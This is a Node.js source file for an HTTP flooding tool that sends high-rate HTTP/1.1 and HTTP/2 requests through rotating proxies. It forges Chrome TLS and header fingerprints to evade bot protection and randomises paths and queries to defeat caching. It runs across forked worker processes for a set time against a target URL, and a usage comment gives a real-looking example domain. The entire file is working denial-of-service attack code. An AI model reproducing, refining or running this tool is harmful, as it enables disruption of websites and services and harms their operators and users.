const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const https = require('node:https')
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', function (e) {
//     console.log(e)
});
process.on('unhandledRejection', function (e) {
//     console.log(e)
});

if (process.argv.length < 7) {
     console.log("usage: ./flood [target] [time] [rate] [threads] [proxy-file] ...args");
     console.log("aruments: --debug true/false, --cookie string, --proxy ip:port, --http 1/2, --ua string, --exploit true/false, --sleep true/false");
     process.exit(0);
}
// [target] [time] [rate] [threads] [proxy-file] ...args
// node killer.js https://khkt.azdigi.blog/ 300 10 30 p.txt

// https.get('https://raw.githubusercontent.com/0xFFFFFFFFA/mylicense/refs/heads/main/working', (res) => {
//      let data = '';
//      res.on('data', (chunk) => {
//           data += chunk;
//      });
//      res.on('end', () => {
//           if (data.trim() !== 'yesbro') {
//                license = "cracked"
//                console.log('License error. Exiting');
//                process.exit(0)
//                process.kill(process.pid, 'SIGKILL')
//           } else {
//                license = "verifed"
//           }
//      });
// });

const target = process.argv[2];
const time = process.argv[3];
const ratelimit = process.argv[4];
const threads = process.argv[5];
const proxyfile = process.argv[6];

let headersPerReset = 10;
let license = ""

const statusesQ = []
let statuses = {}

var target_url = new URL(target);

const raw_proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

function shuffle_proxies(array) {
     for (let i = array.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [array[i], array[j]] = [array[j], array[i]];
     }
     return array;
}

const proxies = shuffle_proxies(raw_proxies);

function get_option(flag) {
     const index = process.argv.indexOf(flag);
     return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
     { flag: '--debug', value: get_option('--debug') },
     { flag: '--reset', value: get_option('--reset') },
     { flag: '--cookie', value: get_option('--cookie') },
     { flag: '--proxy', value: get_option('--proxy') },
     { flag: '--http', value: get_option('--http') },
     { flag: '--ua', value: get_option('--ua') },
     { flag: '--headers', value: get_option('--headers') },
     { flag: '--sleep', value: get_option('--sleep') },
     { flag: '--exploit', value: get_option('--exploit') },
     { flag: '--path', value: get_option('--path') },
     { flag: '--query', value: get_option('--query') },
];

function enabled(buf) {
     var flag = `--${buf}`;
     const option = options.find(option => option.flag === flag);

     if (option === undefined) { return false; }

     const optionValue = option.value;

     if (optionValue === "true" || optionValue === true) {
          return true;
     } else if (optionValue === "false" || optionValue === false) {
          return false;
     }

     if (!isNaN(optionValue)) {
          return parseInt(optionValue);
     }

     if (typeof optionValue === 'string') {
          return optionValue;
     }

     return false;
}

var sleep = enabled('sleep')
var exploit = enabled('exploit')
var headers = enabled('headers')
var knownbotnets = enabled('path')
var querystring = enabled('query')
var cookies = enabled('cookie');
var user_agent = enabled('ua');
var http_v = enabled('http');
const ua = enabled('ua');

// console.log("JSON headers:", headers);
// console.log("Normal headers:", JSON.parse(headers));

function encodeFrame(streamId, type, payload = "", flags = 0) {
     let frame = Buffer.alloc(9)
     frame.writeUInt32BE(payload.length << 8 | type, 0)
     frame.writeUInt8(flags, 4)
     frame.writeUInt32BE(streamId, 5)
     if (payload.length > 0)
          frame = Buffer.concat([frame, payload])
     return frame
}

function decodeFrame(data) {
     if (data.length < 9) return null;

     const lengthAndType = data.readUInt32BE(0)
     const length = lengthAndType >> 8
     const type = lengthAndType & 0xFF
     const flags = data.readUint8(4)
     const streamId = data.readUInt32BE(5)
     const offset = flags & 0x20 ? 5 : 0

     let payload = Buffer.alloc(0)

     if (length > 0) {
          payload = data.subarray(9 + offset, 9 + offset + length)

          if (payload.length + offset != length) {
               return null
          }
     }

     return {
          streamId,
          length,
          type,
          flags,
          payload
     }
}

function encodeSettings(settings) {
     const data = Buffer.alloc(6 * settings.length)
     for (let i = 0; i < settings.length; i++) {
          data.writeUInt16BE(settings[i][0], i * 6)
          data.writeUInt32BE(settings[i][1], i * 6 + 2)
     }
     return data
}

function exit() {
     if (stopped) return;

     stopped = true;

     for (let proc of procs) {
          proc.kill('SIGINT');
     }
     process.exit(0);
}

function generateJA3Fingerprint(socket) {
     const cipherInfo = socket.getCipher();
     const supportedVersions = socket.getProtocol();

     if (!cipherInfo) {
          console.error('Cipher info is not available. TLS handshake may not have completed.');
          return null;
     }

     const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

     const md5Hash = crypto.createHash('md5');
     md5Hash.update(ja3String);

     return md5Hash.digest('hex');
}

function generate_headers() {
     const version = Math.floor(Math.random() * 6) + 123; //123-130
     const randomValue = Math.random()
     const platform = randomValue < 0.33 ? 'Windows' : randomValue < 0.66 ? "Linux" : 'macOS'

     const browser = {
               version: version,
               headers: {
                    'sec-ch-ua': `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`,
                    'sec-ch-mobile': '?0',
                    'sec-ch-ua-platform': `\"${platform}\"`,
                    'upgrade-insecure-requests': '1',
                    'user-agent': `${platform === 'Windows' ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36` : platform === 'Linux' ? `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36` : `Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`}`,
                    'accept': `${Math.random() > 0.5 ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' : '*/*'}`,
                    'sec-fetch-site': '?1',
                    'sec-fetch-mode': 'none',
                    'sec-fetch-user': 'document',
                    'sec-fetch-dest': 'navigate',
                    'accept-encoding': 'gzip, br',
                    'accept-language': 'en-US,en;q=1.0',
                    'cookie': null,
               },
               sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
               ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA',
               settings: {
                    initial_stream_window_size: 6291456,
                    initial_connection_window_size: 15728640,
                    max_concurrent_streams: 1000,
                    max_header_list_size: 262144,
                    header_table_size: 65536,
                    enable_push: false
               }
          }

     return browser;
}

function parse_headers(user_agent) {
     const osRegex = /\(([^)]+)\)/;
     const chromeRegex = /Chrome\/(\d+)/;

     const osMatch = user_agent.match(osRegex);
     const chromeMatch = user_agent.match(chromeRegex);

     let os = 'Windows';
     if (osMatch) {
          const osDetails = osMatch[1];
          if (osDetails.includes('Macintosh')) {
               os = 'macOS';
          } else if (osDetails.includes('Linux')) {
               os = 'Linux';
          } else if (osDetails.includes('Windows')) {
               os = 'Windows'
          }
     }

     const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 130;

     return { os: os, version: chromeVersion };
}

function http1_headers(url) {
     const randomVersion = Math.floor(Math.random() * 6) + 123; //123-130
     const randomValue = Math.random()
     const user_agent = ua ? ua : randomValue < 0.33 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`
     const end = "\r\n";

     let headers = `User-Agent: ${user_agent}${end}`;
     let request = `GET ${knownbotnets ? "/" + [...Array(6)].map(() => Math.random().toString(36).charAt(2)).join('') : url.pathname}${querystring ? `?search=` + [...Array(8)].map(() => Math.random().toString(36).charAt(2)).join('') : ""} HTTP/1.1${end}`;
     request += `Host: ${url.hostname}${url.port ? `:${url.port}` : ''}${end}`;

     //custom shit
     if (cookies) headers += `Cookie: ${cookies}${end}`;

     //default
     headers += `Upgrade-Insecure-Requests: 1${end}`;
     headers += `Accept-Language: ${languages[~~Math.floor(Math.random * languages.length)]}${end}`;
     headers += `Sec-Fetch-Site: ${Math.random() > 0.5 ? 'same-origin' : 'none'} ${end}`;
     headers += `Sec-Fetch-Mode: navigate${end}`;
     headers += `Sec-Fetch-User: ?1${end}`;
     headers += `Sec-Fetch-Dest: document${end}`;
     headers += `Accept-Encoding: gzip, deflate${end}`
     headers += `Accept: ${Math.random() > 0.5 ? `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7` : "*/*"}${end}`;
     headers += `Cache-Control: ${Math.random() > 0.5 ? 'max-age=0' : 'no-cache'}${end}`;
     headers += `Connection: keep-alive${end}`;

     //custom chrome headers
     let chromium = parse_headers(user_agent)
     /*if (chromium.version === 123)      headers += `sec-ch-ua: \"Google Chrome\";v=\"123\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"123\"${end}`;
     else if (chromium.version === 124) headers += `sec-ch-ua: \"Google Chrome\";v=\"124\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"124\"${end}`;
     else if (chromium.version === 125) headers += `sec-ch-ua: \"Google Chrome\";v=\"125\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"125\"${end}`;
     else if (chromium.version === 126) headers += `sec-ch-ua: \"Google Chrome\";v=\"126\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"126\"${end}`;
     else if (chromium.version === 127) headers += `sec-ch-ua: \"Google Chrome\";v=\"127\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"127\"${end}`;
     else if (chromium.version === 128) headers += `sec-ch-ua: \"Google Chrome\";v=\"128\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"128\"${end}`;
     else if (chromium.version === 129) headers += `sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"${end}`;
     else if (chromium.version === 130) headers += `sec-ch-ua: \"Google Chrome\";v=\"130\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"130\"${end}`;*/
     headers += `sec-ch-ua: \"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${chromium.version}\"${end}`
     headers += `sec-ch-mobile: ?0${end}`
     headers += `sec-ch-ua-platform: \"${chromium.os}\"${end}`

     //random
     if (Math.random() > 0.5) headers += `Origin: https://${url.hostname}${end}`
     if (Math.random() > 0.5) headers += `Referer: https://${url.hostname}/${[...Array(Math.floor(Math.random() * 10) + 4)].map(() => Math.random().toString(36).charAt(2)).join('')}.${Math.random() > 0.5 ? 'php' : 'js'}${end}`
     if (Math.random() < 0.9) headers += `purpose: prefetch${end}`
     if (Math.random() > 0.5) headers += `sec-ch-prefers-color-scheme: ${Math.round(Math.random()) === 1 ? 'dark' : 'light'}${end}`

     //exploit
     if (exploit) {
          for (let i = 0; i < Math.floor(Math.random() * 24) + 1; i++) {
               headers += `${[...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('')}: ${[...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('')}${end}`
          }
     }

     //console.log(request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end)

     return request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end;
}

function decode(headers) {
     const header_parts = headers.split('\r\n');
     for (const header of header_parts) {
          if (header.includes('HTTP/1.1') || header.includes('HTTP/1.0')) {
               const status = header.split(' ')[1];
               if (!isNaN(status)) {
                    return status;
               } else {
                    return undefined;
               }
          }
     }
}

const languages = [
     'en-US,en;q=0.9',
     'fr-FR,fr;q=0.9',
     'de-DE,de;q=0.9',
     'es-ES,es;q=0.9',
     'zh-CN,zh;q=0.9',
     'ru-RU,ru;q=0.9',
     'hi-IN,hi;q=0.9',
     'tr-TR,tr;q=0.9',
     'pt-BR,pt;q=0.9',
     'it-IT,it;q=0.9',
     'nl-NL,nl;q=0.9',
     'ko-KR,ko;q=0.9'
];



function detectProxyFormat(proxyString) {
     const formats = {
         "username:password@host:port": /^(\w+):(\w+)@([\w.-]+):(\d+)$/,
         "host:port:username:password": /^([\w.-]+):(\d+):(\w+):(\w+)$/,
         "host:port": /^([\w.-]+):(\d+)$/
     };
 
     for (const [format, regex] of Object.entries(formats)) {
         const match = proxyString.match(regex);
         if (match) {
             let username = "";
             let password = "";
             let host = "";
             let port = "";
 
             switch (format) {
                 case "username:password@host:port":
                     username = match[1];
                     password = match[2];
                     host = match[3];
                     port = match[4];
                     break;
                 case "host:port:username:password":
                     host = match[1];
                     port = match[2];
                     username = match[3];
                     password = match[4];
                     break;
                 case "host:port":
                     host = match[1];
                     port = match[2];
                     break;
             }
 
             return `${username || "myUsername"}:${password || "myPassword"}@${host}:${port}`;
         }
     }
 
     return null; // Không phát hiện được định dạng
 }


function go() {
     let proxyHost, proxyPort, proxyUsername, proxyPassword;
     const proxy = enabled('proxy');
     
     if (proxy) {
          // -----
          const proxyMatch = proxy.match(/^(?:(.*?):(.*?)@)?([\w.-]+):(\d+)$/);
          if (proxyMatch) {
               proxyUsername = proxyMatch[1] || ""; // Username if available
               proxyPassword = proxyMatch[2] || ""; // Password if available
               proxyHost = proxyMatch[3]; // Host
               proxyPort = proxyMatch[4]; // Port
          } else {
               [proxyHost, proxyPort] = proxy.split(':');
          }

     } else {
          [proxyHost, proxyPort, proxyUsername, proxyPassword] = proxies[~~(Math.random() * proxies.length)].split(':');
     }

     // console.log(proxyHost, proxyPort, proxyUsername, proxyName);
     if (Number(proxyPort) === NaN) {
          return
     }



     let SocketTLS;
     const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
          // Base64 encode username and password for Proxy-Authorization
          let proxyAuthHeader = "";
          if (proxyUsername && proxyPassword) {
               const credentials = Buffer.from(`${proxyUsername}:${proxyPassword}`).toString("base64");
               proxyAuthHeader = `Proxy-Authorization: Basic ${credentials}\r\n`;
          }
          

          netSocket.once('data', () => {
               let browser = generate_headers();
               let url = target_url
               let headers = http1_headers(url);

               if (user_agent && cookies) {
                    if (headers && typeof headers !== 'boolean') {
                         try {
                              browser.headers = JSON.parse(headers);
                         } catch (err) {
                              console.log("headers error:", err);
                         }
                    } else {
                         const parsed = parse_headers(user_agent);
                         browser.headers = versions["chrome"][parsed.version].headers;
                    }
                    const chromium = parse_headers(user_agent)
                    browser.headers['user-agent'] = user_agent;
                    browser.headers['sec-ch-ua'] = `\"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${chromium.version}\"`
                    browser.headers['sec-ch-platform'] = `\"${chromium.os}\"`
                    browser.headers['cookie'] = cookies;
               }

               SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: http_v == 2 ? ['h2', 'http/1.1'] : http_v == 1 ? ['http/1.1'] : ['h2', 'http/1.1'],
                    host: url.hostname,
                    servername: url.host,
                    ciphers: browser.ciphers,
                    minVersion: Math.random() < 0.5 ? 'TLSv1.3' : 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    rejectUnauthorized: false
               }, () => {
                    SocketTLS.allowHalfOpen = true;
                    SocketTLS.setNoDelay(true);
                    SocketTLS.setKeepAlive(true, 60000);
                    SocketTLS.setMaxListeners(0);
                    if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol == 'http/1.1' && http_v === 1) {
                         if (http_v == 2 || !http_v) {
                              SocketTLS.end(() => SocketTLS.destroy())
                              return
                         }
                         function http1() {
                              SocketTLS.write(headers, (err) => {
                                   if (!err) {
                                        setTimeout(() => {
                                             http1()
                                        }, !sleep ? 0 : 1000 / ratelimit)
                                   } else {
                                        SocketTLS.end(() => SocketTLS.destroy());
                                   }
                              })
                         }

                         http1()

                         SocketTLS.on('error', (err) => {
                              SocketTLS.end(() => SocketTLS.destroy())
                         })

                         SocketTLS.on('data', (data) => {
                              const status = decode(data.toString('utf-8'));
                              if (!isNaN(status)) {
                                   if (!statuses[status])
                                        statuses[status] = 0

                                   statuses[status]++
                              }
                              if (status === '301' || status === '302') {
                                   url = new URL(data.toString('utf-8').toLowerCase().split('\r\n').find(line => line.startsWith('location: ')).replace('location: ', ''), url.href);
                                   console.log(url)
                              }
                              const response_cookies = data.toString('utf-8').toLowerCase().split('\r\n').find(line => line.startsWith('set-cookie: '))
                              if (response_cookies !== undefined) {
                                   if (browser.headers['cookie'] === null && !cookies) browser.headers['cookie'] = response_cookies.replace('set-cookie: ', '');
                                   else if (browser.headers['cookie'] === null && cookies) browser.headers['cookie'] = cookies + "; " + response_cookies.replace('set-cookie: ', '')
                              }
                         })

                         return;
                    }

                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(15663105, 0);

                    const frames = [
                         Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'),
                         encodeFrame(0, 4, encodeSettings([
                              [1, Math.random() < 0.5 ? 65536 : 65535],       //headerTableSize
                              [2, 0],                                         //enablePush
                              [3, Math.random() < 0.5 ? 100 : 1000],          //maxConcurrentStreams
                              [4, Math.random() < 0.5 ? 6291456 : 33554432],  //initialWindowSize
                              [5, 16384],                                     //maxFrameSize
                              [6, 262144]                                     //maxHeaderListSize
                         ])),
                         encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                         data = Buffer.concat([data, eventData])
                         while (data.length >= 9) {
                              const frame = decodeFrame(data)
                              if (frame) {
                                   data = data.subarray(frame.length + 9)
                                   if (frame.type == 4 && frame.flags == 0) {
                                        // SETTINGS frame
                                        //                                      console.log("Got settings frame: "+frame.payload)
                                        SocketTLS.write(encodeFrame(0, 4, "", 1))
                                   }

                                   if (frame.type == 0) {
                                        // DATA frame
                                        let window_size = frame.length;
                                        if (window_size < 6000) {
                                             let inc_win = 65536 - window_size;
                                             window_size += inc_win;
                                             // console.log("window size:", window_size);
                                             const update_win = Buffer.alloc(4);
                                             update_win.writeUInt32BE(inc_win, 0);
                                             SocketTLS.write(encodeFrame(0, 8, update_win));
                                        }
                                   }

                                   if (frame.type == 1) {
                                        // HEADERS frame
                                        try {
                                             const status = parseInt(hpack.decode(frame.payload).find(x => x[0] == ':status')[1]);
                                             if (!isNaN(status) && status >= 100 && status <= 599) {
                                                  // console.log("status:", status);
                                                  if (!statuses[status])
                                                       statuses[status] = 0

                                                  statuses[status]++

                                                  if (status === 302 || status === 301) {
                                                       const redirect = hpack.decode(frame.payload).find(x => x[0] == 'location')[1];
                                                       url = new URL(redirect, url.href);
                                                  }

                                                  if (status === 429) {
                                                       
                                                  }

                                                  try {
                                                       const response_cookies = hpack.decode(frame.payload).find(x => x[0] == 'set-cookie')[1];
                                                       if (response_cookies) {
                                                            if (browser.headers['cookie'] === null && !cookies) browser.headers['cookie'] = response_cookies
                                                            else if (browser.headers['cookie'] === null && cookies) browser.headers['cookie'] = cookies + "; " + response_cookies
                                                       }
                                                  } catch (_) {

                                                  }
                                             }
                                        } catch (_err) {
                                             // console.log(err);
                                             // const headers = hpack.decode(frame.payload);
                                             // if (headers.includes('status')) {
                                             //     console.log(headers);
                                             // }
                                             // console.log(headers);

                                        }
                                   }
                                   if (frame.type == 6) {
                                        if (!(frame.flags & 0x1)) {
                                             SocketTLS.write(encodeFrame(0, 6, frame.payload, 0x1));
                                        }
                                   }
                                   if (frame.type == 7 || frame.type == 5) {
                                        if (frame.type == 7) {
                                             if (!statuses["GOAWAY"])
                                                  statuses["GOAWAY"] = 0

                                             statuses["GOAWAY"]++
                                        }
                                        SocketTLS.end(() => SocketTLS.destroy())
                                   }

                              } else {
                                   break
                              }
                         }
                    })

                    SocketTLS.on('error', (err) => {
                         return;
                    })

                    SocketTLS.on('close', () => {
                         return;
                    })

                    SocketTLS.write(Buffer.concat(frames))

                    function main() {
                         let requests_sent = 0;
                         if (SocketTLS.destroyed) {
                              return
                         }
                         for (let i = 0; i < ratelimit; i++) {
                              const headers = Object.entries({
                                   ':method': 'GET',
                                   ':authority': url.hostname,
                                   ':scheme': 'https',
                                   ':path': `${knownbotnets ? "/" + [...Array(6)].map(() => Math.random().toString(36).charAt(2)).join('') : url.pathname}${querystring ? `?search=` + [...Array(8)].map(() => Math.random().toString(36).charAt(2)).join('') : ""}`
                              }).filter(a => a[1] != null);

                              const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');


                              const metadata = {
                                   site: ['cross-site', 'same-site', 'same-origin', 'none'],
                                   mode: ['cors', 'no-cors', 'navigate', 'websocket', 'no-cors'],
                                   dest: ['document', 'empty', 'iframe', 'image', 'script', 'style']
                              };

                              if (requests_sent > 1) {
                                   browser.headers['sec-fetch-site'] = metadata.site[~~Math.floor(Math.random * metadata.site.length)];
                                   browser.headers['sec-fetch-mode'] = metadata.mode[~~Math.floor(Math.random() * metadata.mode.length)];
                                   browser.headers['sec-fetch-dest'] = metadata.dest[~~Math.floor(Math.random() * metadata.dest.length)];
                              }

                              const headers2 = Object.entries({
                                   'sec-ch-ua': browser.headers['sec-ch-ua'],
                                   'sec-ch-mobile': browser.headers['sec-ch-mobile'],
                                   'sec-ch-ua-platform': browser.headers['sec-ch-ua-platform'],
                                   'upgrade-insecure-requests': browser.headers['upgrade-insecure-requests'],
                                   'user-agent': browser.headers['user-agent'],
                                   'accept': browser.headers['accept'],
                                   'sec-fetch-site': browser.headers['sec-fetch-site'],
                                   'sec-fetch-mode': browser.headers['sec-fetch-mode'],
                                   'sec-fetch-user': browser.headers['sec-fetch-user'],
                                   'sec-fetch-dest': browser.headers['sec-fetch-dest'],
                                   'accept-encoding': browser.headers['accept-encoding'],
                                   'accept-language': browser.headers['accept-language'],
                                   'cookie': browser.headers['cookie'],
                                   'cache-control': Math.random() > 0.5 ? 'max-age=0' : 'no-cache',
                                   'priority': `u=${Math.round(Math.random()*5)}, i`
                                   // 'x-forwarded-for': random_ip()
                              }).filter(a => a[1] != null);


                              const headers3 = Object.entries({
                                   ...(Math.random() < 0.5 && { [`referer`]: `https://${url.hostname}/${randomString}.${Math.random() > 0.5 ? 'php' : 'js'}` }),
                                   ...(Math.random() < 0.4 && { [`origin`]: `${url.href}` }),
                                   ...(Math.random() < 0.9 && { ['purpose']: 'prefetch' }),
                                   ...(Math.random() < 0.5 && { ['sec-ch-prefers-color-scheme']: Math.round(Math.random()) === 1 ? 'dark' : 'light' }),
                              }).filter(a => a[1] != null)

                              const combinedHeaders = headers.concat(headers2).concat(headers3);

//                              console.log(streamId, combinedHeaders);
                              // process.exit(0);

                              const packed = Buffer.concat([
                                   Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                   hpack.encode(combinedHeaders)
                              ]);

                              SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                              requests_sent += 1;
                              // if (requests_sent >= ratelimit) {
                              //     SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                              //     SocketTLS.end(() => SocketTLS.destroy());
                              // }
                              // if (headersPerReset <= requests_sent) {
                              //     SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                              //     // headersPerReset = 0;
                              //     requests_sent = 0;
                              // }
//                              if (streamId > 10000) console.log("return"); return
                              streamId += 2;
                         }
                         setTimeout(() => {
                              main()
                         }, !sleep ? 0 : 1000 / ratelimit);
                    }
                    main()
               }).on('error', (err) => {
                    // console.log(err);
                    SocketTLS.destroy()
               })
          })
          // netSocket.write(`CONNECT ${target_url.host}:443 HTTP/1.1\r\nHost: ${target_url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

          // Send CONNECT request to the proxy
          
          netSocket.write(
               `CONNECT ${target_url.host}:443 HTTP/1.1\r\n` +
               `Host: ${target_url.host}:443\r\n` +
               `${proxyAuthHeader}` +
               `Proxy-Connection: Keep-Alive\r\n\r\n`
          );


     }).once('error', (err) => {
          // console.log(err)
     }).once('close', () => {
          if (SocketTLS) {
               SocketTLS.end(() => { SocketTLS.destroy(); go() })
          }
     })
}



if (cluster.isMaster) {
     const workers = {}

     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

     // cluster.on('exit', (worker) => {
     //     cluster.fork({ core: worker.id % os.cpus().length });
     // });

     cluster.on('message', (worker, message) => {
          workers[worker.id] = [worker, message]
     })

     if (enabled('debug')) {
          setInterval(() => {
               let statuses = {}
               for (let w in workers) {
                    if (workers[w][0].state == 'online') {
                         for (let st of workers[w][1]) {
                              for (let code in st) {
                                   if (statuses[code] == null)
                                        statuses[code] = 0

                                   statuses[code] += st[code]
                              }
                         }
                    }
               }
               let d = new Date();
               let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
               let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
               let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
               console.log(`${hours}:${minutes}:${seconds} `, statuses);
          }, 1000)
     }

     setTimeout(() => process.exit(1), time * 1000);

} else {
     setInterval(() => { go() });
     if (enabled('debug')) {
          setInterval(() => {
               if (statusesQ.length >= 4)
                    statusesQ.shift()

               statusesQ.push(statuses)
               statuses = {}
               process.send(statusesQ)
          }, 250)
     }
     setTimeout(() => process.exit(1), time * 1000);
}
